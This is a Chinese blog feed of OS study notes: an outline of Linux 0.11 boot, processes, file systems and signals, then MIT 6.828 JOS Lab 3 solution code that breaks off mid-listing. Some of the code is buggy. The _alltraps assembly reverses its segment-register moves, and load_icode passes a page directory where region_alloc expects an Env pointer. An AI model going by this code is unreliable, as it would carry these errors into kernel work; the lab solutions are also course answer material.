        <content type="html"><![CDATA[<p>Linux0.11内核.正文部分记录过程,引用部分记录知识点和理解.</p><h1 id="main函数之前的功能"><a href="#main函数之前的功能" class="headerlink" title="main函数之前的功能"></a>main函数之前的功能</h1><h2 id="加载操作系统"><a href="#加载操作系统" class="headerlink" title="加载操作系统"></a>加载操作系统</h2><p>经典流程:<br>计算机加电设置cs:ip为0xffff0,运行ROM中的BIOS,BIOS初始化中断向量表和一些硬件设备,加载0盘0道1扇区的引导程序bootsect到0x7c00处.bootsect是与操作系统配套的,规划物理内存,加载操作系统,设置根设备为软盘.</p><blockquote><p>Linux0.11要求系统必须存在一个根文件系统,其他文件系统挂接其上.因此Linux的启动需要两部分数据,即系统内核镜像和根文件系统.(kernel pwn中的bzimage和文件系统(比如busybox提供的))</p></blockquote><span id="more"></span><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>关闭中断.设置全局描述符表(GDT),打开A20gate实现32位寻址(实模式下寻址范围为低1MB).CR0PE标志置1,enable 保护模式,GDT启用,段基址寄存器以选择子形式使用.</p><p>设置段寄存器以适应保护模式,建立内核页目录表,建立中断描述符表(IDT),开启分页模式.以ret模式进入main函数.</p><h1 id="环境设备初始化及激活进程0"><a href="#环境设备初始化及激活进程0" class="headerlink" title="环境设备初始化及激活进程0"></a>环境设备初始化及激活进程0</h1><p>初始化根设备和硬盘.设置缓冲区.</p><blockquote><p>除内核代码及其数据所占物理空间之外,其余物理内存主要分为3部分,主内存区(进程代码运行的空间),缓冲区(主机与外设进行数据交互的中转站),虚拟盘(可以缓存外设的数据,提高效率).</p></blockquote><p>建立内存管理基址mmu,将中断异常与IDT挂接(其实这里才是建立中断描述符表吧).开启部分中断.</p><p>初始化块设备请求项结构</p><blockquote><p>Linux0.11将外设分为两类:<br>块设备:将存储空间等分为若干同样大小的小存储空间块,每个块有块号,可以独立,随机读写,如硬盘,软盘.<br>字符设备:以字符为单位进行IO通信,如键盘,命令行显示器.</p></blockquote><p>进程想与块设备沟通,必须经过主机内存中的缓冲区.请求项管理结构就是管理缓冲区中缓冲块与块设备上逻辑块之间读写关系的数据结构.是以一个数组,同时也维护一个请求链表.</p><p>挂接交互界面相关外设的中断服务例程.如串行口,显示器,键盘.</p><p>初始化进程0,设置task_struct,使进程0具有处理系统调用的能力,设置时钟中断做好进程切换的准备工作.</p><p>最后以iret(唯一的从高权限到低权限的方式)的方式切换到3特权级,之前运行的内核控制流正式成为进程0.</p><h1 id="进程1的创建及执行"><a href="#进程1的创建及执行" class="headerlink" title="进程1的创建及执行"></a>进程1的创建及执行</h1><p>进程0通过fork创建进程1,设置相关数据结构,切换到进程1.</p><blockquote><p>通常有以下两种情况可以产生进程切换:</p><ol><li>允许进程运行的时间结束.每个进程在创建时都被赋予了有限的时间片,当时间片减少到0便发生进程切换.</li><li>进程的运行停止.比如等待外设的数据,等待其他程序运行的结果,进程主动停止一段时间或进程执行完毕等等.</li></ol></blockquote><p>进程1安装硬盘文件系统.格式化虚拟盘(使其具有文件系统相关内容,引导块,超级块,格式化之后虚拟盘正式成为一个块设备)并更换根设备为虚拟盘.</p><blockquote><p>操作系统中的文件系统可以大致分为两部分,一部分在操作系统内核中,另一部分在硬盘,软盘,虚拟盘中.<br>文件系统用inode(i结点)来管理文件,一个inode管理一个文件.文件的路径在操作系统中由目录文件中的目录项管理,一个目录项对应一级路径,目录文件也是文件,也由一个inode管理.一个目录文件挂在另一个目录文件的目录项上,就成了父子目录的关系.所有的文件最终挂接成一个树形结构,树根i节点就叫这个文件系统的根i节点.一个逻辑设备(一个物理设备可分成多个逻辑设备)只能包含一个这样的树形结构.</p></blockquote><blockquote><p>加载文件系统最重要的标志,就是把一个逻辑设备上的文件系统的根i节点,关联到另一个文件系统的i节点,也就是常说的mount.可以联系一下之前容器中bind mount的操作.</p></blockquote><blockquote><p>一个文件系统必须挂接在另一个文件系统上,必然就存在一个根文件系统,Linux0.11中的super_block[8]中保存的根设备的超级块对应的文件系统便是根文件系统.</p></blockquote><h1 id="进程2的创建及执行"><a href="#进程2的创建及执行" class="headerlink" title="进程2的创建及执行"></a>进程2的创建及执行</h1><p>加载完根文件系统之后,进程1(其实是kernel)具备了对设备文件的访问能力.使用open和dup打开/dev/tty0文件作为标准输入,输出,错误文件.</p><p>进程1创建进程2并切换到进程2.进程2关闭标准输入重新以/etc/rc为标准输入,execve运行/bin/sh的shell程序.相当于shell的初始化,执行/etc/rc里的预置命令,比如创建进程并加载/etc/update程序</p><blockquote><p>update进程将缓冲区中的数据同步到外设.该程序每隔一段时间就会被唤醒,完成同步工作后挂起等待下一次唤醒.</p></blockquote><p>update进程挂起后控制流回到进程2,进程2完成善后工作后退出.</p><p>进程1继续执行,以/dev/tty0为标准输入重建shell.shell在等待输入后挂起,当接收到键盘中断,shell进程从字符缓冲队列(其实就是tty0的内容)读取指令数据,并完成相应操作.</p><p>至此系统进入怠速状态.</p><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><blockquote><p>安装文件系统就是在根文件系统的基础上,把硬盘中的文件系统安装在根文件系统上,使操作系统也具备<code>以文件形式与硬盘进行数据交互的能力</code>.</p></blockquote><blockquote><p>安装文件系统分三步:<br>1)将硬盘的超级块读取出来并载入super_block[8].<br>2)将虚拟盘上指定的i节点读出,加载到系统的inode_table[32]中.<br>(<del>是不是意味着最多只能挂载8个文件系统(设备),挂载点最多32个?</del>)<br>3) 将硬盘上的超级块挂接到指定的i节点上.</p></blockquote><h1 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h1><h2 id="管道机制"><a href="#管道机制" class="headerlink" title="管道机制"></a>管道机制</h2><blockquote><p>操作系统在内存中为每个管道开辟一页内存,为这一页内存赋予文件的属性,这一页内存由两个进程共享,但不会分配给任何进程,只由内核掌控.</p></blockquote><blockquote><p>从技术上看,管道就是一页内存.<br>1)文件属性:创建管道相当于创建(并打开)一个文件,进程对管道的访问形式与访问文件相同.<br>2)减少页属性:该页不映射到进程的地址空间内.无法被进程以内存形式访问.</p></blockquote><h2 id="信号机制"><a href="#信号机制" class="headerlink" title="信号机制"></a>信号机制</h2><blockquote><p>发送信号:<br>1)进程通过调用特定的库函数给另一个进程发送信号,另一种方式是用户通过键盘输入信息产生键盘中断后,中断服务例程给进程发送信号.发送信号的实质是设置信号位图上的信号位.(这也是为何未处理的相同信号会丢失的原因)</p></blockquote><blockquote><p>系统检测进程接收到的信号:<br>进程并不能检测收到的信号,该工作由内核完成.</p><ol><li>在系统调用返回之前检测当前进程是否接收到信号.</li><li>时钟中断产生后,其中断处理例程执行结束之前检测.</li></ol></blockquote><blockquote><p>处理信号.当用户程序不需要处理信号时,信号处理函数完全不参与用户进程的执行,当用户进程需要处理信号时,进程的程序将暂时停止执行,转而去执行信号处理函数,执行完毕后将从暂停的现场继续执行.</p></blockquote><p>这里处理信号的方式挺有意思的,解决了我看CSAPP时的一个疑问.</p><blockquote><p>在系统调用返回前或时钟中断返回前,先把内核栈中保存的寄存器备份在当前进程的<code>用户栈</code>中,修改内核栈中的寄存器使得iret之后跳转到用户空间的信号处理函数.处理完成后,再通过前面备份在用户空间的指令和数据,返回用户空间执行.</p></blockquote><p>这里又有一个问题,既然已经回到用户态了,那即使在用户栈上布置的暂停现场的状态,也无法通过ret指令完成状态(如edi等寄存器)的恢复.原来在信号处理函数完成后,从栈上弹出的返回地址是一个restorer函数的地址,它将完成用户进程状态的恢复并再次ret到用户进程.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab3</title>
      <link href="/2023/6.828-Lab3/"/>
      <url>/2023/6.828-Lab3/</url>
      
        <content type="html"><![CDATA[<h1 id="Lec-7"><a href="#Lec-7" class="headerlink" title="Lec 7"></a>Lec 7</h1><p>一些虚拟内存实现的技巧,如延迟分配,写时复制等<br><a href="https://pdos.csail.mit.edu/6.828/2018/lec/l-usingvm.pdf">https://pdos.csail.mit.edu/6.828/2018/lec/l-usingvm.pdf</a></p><h2 id="Lab3-User-Environments"><a href="#Lab3-User-Environments" class="headerlink" title="Lab3 User Environments"></a>Lab3 User Environments</h2><h3 id="PartA-User-Environments-and-Exception-Handling"><a href="#PartA-User-Environments-and-Exception-Handling" class="headerlink" title="PartA: User Environments and Exception Handling"></a>PartA: User Environments and Exception Handling</h3><h4 id="Creating-and-Running-Environments"><a href="#Creating-and-Running-Environments" class="headerlink" title="Creating and Running Environments"></a>Creating and Running Environments</h4><p>创建并初始化envs,env_setup_vm函数为环境e建立一个专属的页目录表,由于在UTOP上的内核空间映射对每个环境都是相同的,所以可以直接拷贝kern_pgdir过来.</p><span id="more"></span><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// Set up envs array</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">for</span>(e = envs;e&lt;envs+NENV;++e)</span><br><span class="line">{</span><br><span class="line">e-&gt;env_id = <span class="number">0</span>;</span><br><span class="line">e-&gt;env_status = ENV_FREE;</span><br><span class="line">e-&gt;env_link = (e==envs+NENV<span class="number">-1</span>)?<span class="number">0</span>:e+<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">env_free_list = envs;</span><br><span class="line"><span class="comment">// Per-CPU part of the initialization</span></span><br><span class="line">env_init_percpu();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">env_setup_vm</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page for the page directory</span></span><br><span class="line"><span class="keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">e-&gt;env_pgdir = page2kva(p);</span><br><span class="line"><span class="built_in">memcpy</span>(e-&gt;env_pgdir,kern_pgdir,PGSIZE);</span><br><span class="line">p-&gt;pp_ref++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UVPT maps the env's own page table read-only.</span></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>由于还没有文件系统,JOS采用将ELF文件直接链接到内核的方式来提供用户程序,load_icode函数按照binary文件中的ELF头和程序头,将binary映像加载到用户进程(以JOS的概念,进程应该改成环境)空间中,并建立用户页表的相应映射.</p><p>实现这一函数主要是熟悉ELF头和程序头各项的意义,其实在MBR加载内核映像的时候我们已经完成过相同的操作.注意页目录表的切换.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">load_icode</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="type">uint8_t</span> *binary)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf</span> *<span class="title">elfhdr</span> =</span> (<span class="keyword">struct</span> Elf *)binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(elfhdr-&gt;e_magic!=ELF_MAGIC)</span><br><span class="line">panic(<span class="string">"invalid ELF format,magic is not correct\n"</span>);</span><br><span class="line"></span><br><span class="line">ph = (<span class="keyword">struct</span> Proghdr *)((<span class="type">uint8_t</span>*)elfhdr+elfhdr-&gt;e_phoff);</span><br><span class="line">eph = ph+elfhdr-&gt;e_phnum;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为使之后能直接使用memcpy,切换到用户页表.</span></span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(;ph&lt;eph;++ph)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz)</span><br><span class="line">panic(<span class="string">"file size is great than memmory size\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(ph-&gt;p_type==ELF_PROG_LOAD)</span><br><span class="line">{</span><br><span class="line">region_alloc(e-&gt;env_pgdir,ph-&gt;p_va,ph-&gt;p_memsz);</span><br><span class="line"><span class="built_in">memcpy</span>(ph-&gt;p_va,binary+ph-&gt;p_offset,ph-&gt;p_filesz);</span><br><span class="line"><span class="built_in">memset</span>(ph-&gt;p_va+ph-&gt;p_filesz,<span class="number">0</span>,ph-&gt;p_memsz-ph-&gt;p_filesz);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">e-&gt;env_tf.tf_eip = elfhdr-&gt;e_entry;</span><br><span class="line"><span class="comment">// Now map one page for the program's initial stack</span></span><br><span class="line"><span class="comment">// at virtual address USTACKTOP - PGSIZE.</span></span><br><span class="line">region_alloc(e-&gt;env_pgdir,USTACKTOP-PGSIZE,PGSIZE);</span><br><span class="line"></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocate len bytes of physical memory for environment env,</span></span><br><span class="line"><span class="comment">// and map it at virtual address va in the environment's address space.</span></span><br><span class="line"><span class="comment">// Does not zero or otherwise initialize the mapped pages in any way.</span></span><br><span class="line"><span class="comment">// Pages should be writable by user and kernel.</span></span><br><span class="line"><span class="comment">// Panic if any allocation attempt fails.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">region_alloc</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="type">void</span> *va, <span class="type">size_t</span> len)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// (But only if you need it for load_icode.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: It is easier to use region_alloc if the caller can pass</span></span><br><span class="line"><span class="comment">//   'va' and 'len' values that are not page-aligned.</span></span><br><span class="line"><span class="comment">//   You should round va down, and round (va + len) up.</span></span><br><span class="line"><span class="comment">//   (Watch out for corner-cases!)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">pp</span>;</span></span><br><span class="line"><span class="type">void</span>* end_va = ROUNDUP(va+len,PGSIZE);</span><br><span class="line">va = ROUNDDOWN(va,PGSIZE);</span><br><span class="line"><span class="keyword">for</span>(;va&lt;end_va;va += PGSIZE)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((pp = page_alloc(ALLOC_ZERO))==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"region_alloc:out of memory"</span>);</span><br><span class="line">}</span><br><span class="line">page_insert(e-&gt;env_pgdir,pp,va,PTE_U|PTE_W|PTE_P);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后便可以创建用户环境并运行.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_create</span><span class="params">(<span class="type">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> ret = env_alloc(&amp;e,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"env_alloc:%e"</span>,ret);</span><br><span class="line">e-&gt;env_type = type;</span><br><span class="line">load_icode(e,binary);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_run</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span>(curenv != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(curenv-&gt;env_status==ENV_RUNNING)</span><br><span class="line">curenv-&gt;env_status=ENV_RUNNABLE;</span><br><span class="line">}</span><br><span class="line">curenv = e;</span><br><span class="line">e-&gt;env_status=ENV_RUNNING;</span><br><span class="line">e-&gt;env_runs++;</span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line">env_pop_tf(&amp;e-&gt;env_tf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h5 id="env相关流程分析"><a href="#env相关流程分析" class="headerlink" title="env相关流程分析"></a>env相关流程分析</h5><h6 id="创建与初始化"><a href="#创建与初始化" class="headerlink" title="创建与初始化"></a>创建与初始化</h6><p>i386_init函数在mem_init函数中完成envs数组的内存分配并在kern_pgdir中完成映射.<br>调用env_init,初始化envs数组中的各env,并链入env_free_list等待分配,load新的带有用户段的GDT,设置LDT.</p><h6 id="运行准备与运行"><a href="#运行准备与运行" class="headerlink" title="运行准备与运行"></a>运行准备与运行</h6><p>env_create函数创建一个针对特定二进制(ELF)文件的运行环境.先调用env_alloc函数分配一个env结构,设置env环境(包括各段选择子,这是切换到用户级权限的关键之一),并为env建立一个单独的页表,映射内核及该页表本身.<br>调用load_icode函数按ELF头和文件头记录的信息为ELF格式的可执行文件创建内存映像,设置Trapframe-&gt;tf_eip为该程序的入口点,为环境映射一个初始栈.<br>env_run函数设置相关运行信息,调用env_pop_tf函数用env-&gt;env_tf设置程序状态,开始以用户级权限运行程序.</p><h4 id="Handling-Interrupts-and-Exceptions"><a href="#Handling-Interrupts-and-Exceptions" class="headerlink" title="Handling Interrupts and Exceptions"></a>Handling Interrupts and Exceptions</h4><p>trapentry.S中以宏的方式形式定义了各中断处理例程的入口,以及所有traps共用的例程alltraps.<br>该函数按照Trapframe的结构为trap函数压栈准备参数,设置ds和es寄存器.然后调用trap函数且不再返回.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">/* TRAPHANDLER defines a globally-visible function for handling a trap.</span><br><span class="line"> * It pushes a trap number onto the stack, then jumps to _alltraps.</span><br><span class="line"> * Use TRAPHANDLER for traps where the CPU automatically pushes an error code.</span><br><span class="line"> *</span><br><span class="line"> * You shouldn't call a TRAPHANDLER function from C, but you may</span><br><span class="line"> * need to _declare_ one in C (for instance, to get a function pointer</span><br><span class="line"> * during IDT setup).  You can declare the function with</span><br><span class="line"> *   void NAME();</span><br><span class="line"> * where NAME is the argument passed to TRAPHANDLER.</span><br><span class="line"> */</span><br><span class="line">#define TRAPHANDLER(name, num)\</span><br><span class="line">.globl name;/* define global symbol for 'name' */\</span><br><span class="line">.type name, @function;/* symbol type is function */\</span><br><span class="line">.align 2;/* align function definition */\</span><br><span class="line">name:/* function starts here */\</span><br><span class="line">pushl $(num);\</span><br><span class="line">jmp _alltraps</span><br><span class="line"></span><br><span class="line">/* Use TRAPHANDLER_NOEC for traps where the CPU doesn't push an error code.</span><br><span class="line"> * It pushes a 0 in place of the error code, so the trap frame has the same</span><br><span class="line"> * format in either case.</span><br><span class="line"> */</span><br><span class="line">#define TRAPHANDLER_NOEC(name, num)\</span><br><span class="line">.globl name;\</span><br><span class="line">.type name, @function;\</span><br><span class="line">.align 2;\</span><br><span class="line">name:\</span><br><span class="line">pushl $0;\</span><br><span class="line">pushl $(num);\</span><br><span class="line">jmp _alltraps</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line"></span><br><span class="line">TRAPHANDLER_NOEC(divide_handler, T_DIVIDE);</span><br><span class="line">//......</span><br><span class="line">//其他中断定义方式相同,这里省略了</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Lab 3: Your code here for _alltraps</span><br><span class="line"> */</span><br><span class="line">.global _alltraps</span><br><span class="line">_alltraps:</span><br><span class="line">pushl %ds;</span><br><span class="line">pushl %es;</span><br><span class="line">pushal;</span><br><span class="line"></span><br><span class="line">movw $GD_KD,%ax;</span><br><span class="line">movw %ds,%ax;</span><br><span class="line">movw %es,%ax;</span><br><span class="line"></span><br><span class="line">pushl %esp;</span><br><span class="line">call trap;</span><br></pre></td></tr></tbody></table></figure><p>下面是Trapframe结构的定义,由注释分为三个部分,<br>最下面的一部分仅在发生特权级切换的时候才压入.<br>下图中的Trapframe部分在发生异常时由处理器硬件压入.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310030006345.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PushRegs</span> {</span></span><br><span class="line"><span class="comment">/* registers as pushed by pusha */</span></span><br><span class="line"><span class="type">uint32_t</span> reg_edi;</span><br><span class="line"><span class="type">uint32_t</span> reg_esi;</span><br><span class="line"><span class="type">uint32_t</span> reg_ebp;</span><br><span class="line"><span class="type">uint32_t</span> reg_oesp;<span class="comment">/* Useless */</span></span><br><span class="line"><span class="type">uint32_t</span> reg_ebx;</span><br><span class="line"><span class="type">uint32_t</span> reg_edx;</span><br><span class="line"><span class="type">uint32_t</span> reg_ecx;</span><br><span class="line"><span class="type">uint32_t</span> reg_eax;</span><br><span class="line">} __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PushRegs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line"><span class="type">uint16_t</span> tf_es;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding1;</span><br><span class="line"><span class="type">uint16_t</span> tf_ds;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding2;</span><br><span class="line"><span class="type">uint32_t</span> tf_trapno;</span><br><span class="line"><span class="comment">/* below here defined by x86 hardware */</span></span><br><span class="line"><span class="type">uint32_t</span> tf_err;</span><br><span class="line"><span class="type">uintptr_t</span> tf_eip;</span><br><span class="line"><span class="type">uint16_t</span> tf_cs;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding3;</span><br><span class="line"><span class="type">uint32_t</span> tf_eflags;</span><br><span class="line"><span class="comment">/* below here only when crossing rings, such as from user to kernel */</span></span><br><span class="line"><span class="type">uintptr_t</span> tf_esp;</span><br><span class="line"><span class="type">uint16_t</span> tf_ss;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding4;</span><br><span class="line">} __attribute__((packed));</span><br></pre></td></tr></tbody></table></figure><h5 id="trap流程分析"><a href="#trap流程分析" class="headerlink" title="trap流程分析"></a>trap流程分析</h5><p>i386_init中调用trap_init完成trap的初始化:将各中断处理例程(在本实现中是中断处理例程的入口点)挂接到IDT中,设置TSS段(存储了内核栈的地址信息)并挂接到GDT中,设置IDT和TSS.</p><p>当中断或异常发生,处理器根据中断向量号在IDT中寻找对应的中断处理例程,在进行特权级检查(中断处理例程DPL≤CPL≤中断门描述符DPL)后,若发生特权级转换,CPU从当前TSS段中取出内核栈的地址信息(ss,esp)并加载到ss,esp寄存器中(加载前临时保存原值).在内核栈中压入原栈地址,再压入CS和eip,跳转到中断处理例程.接下来由操作系统(而不是处理器)压入错误码(是否压入因异常而异)及其他寄存器信息,形成Trapframe结构.跳转到trap函数.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 